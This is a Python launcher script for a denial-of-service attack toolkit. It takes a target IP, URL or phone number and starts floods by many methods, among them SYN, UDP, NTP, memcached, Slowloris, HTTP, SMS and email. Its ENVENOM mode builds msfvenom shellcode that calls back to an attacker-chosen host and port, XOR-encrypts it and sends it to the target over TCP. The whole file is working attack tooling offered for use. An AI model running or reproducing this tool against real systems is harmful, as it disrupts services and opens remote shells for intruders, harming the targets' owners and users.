#!/usr/bin/python3
import os
import sys
import argparse

os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
    from tools.L4.envenom import generate_shellcode, send_shellcode_via_tcp, xor_encrypt
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

def tcp_shellcode_attack(target, port, payload, lhost, lport, num_packets, burst_interval):
    shellcode = generate_shellcode(payload, lhost, lport)
    encrypted_shellcode = xor_encrypt(shellcode, key=0xAA)
    send_shellcode_via_tcp(encrypted_shellcode, target, port)

parser = argparse.ArgumentParser(description="Denial-of-Service Attack ToolKit")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="Target IP:port, url or phone",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP/ENVENOM>",
    help="Attack method",
)
parser.add_argument(
    "--time",
    type=int, default=10,
    metavar="<time>",
    help="time in seconds"
)
parser.add_argument(
    "--threads",
    type=int, default=3,
    metavar="<threads>",
    help="threads count (1-200)"
)
parser.add_argument(
    "--payload",
    type=str, help='Payload for msfvenom'
)
parser.add_argument(
    "--lhost",
    type=str, help='Local host for msfvenom payload'
)
parser.add_argument(
    "--lport",
    type=int, help='Local port for msfvenom payload'
)
parser.add_argument(
    "--num_packets",
    type=int, default=10, help='Number of packets to send'
)
parser.add_argument(
    "--burst_interval",
    type=float, default=1.0, help='Interval between packets in seconds'
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if not method or not target or not time:
    parser.print_help()
    sys.exit(1)

if method == "ENVENOM":
    if not args.payload or not args.lhost or not args.lport:
        print("Payload, LHOST, and LPORT are required for ENVENOM method.")
        sys.exit(1)
    target_ip, target_port = target.split(":")
    tcp_shellcode_attack(target_ip, int(target_port), args.payload, args.lhost, args.lport, args.num_packets, args.burst_interval)
else:
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()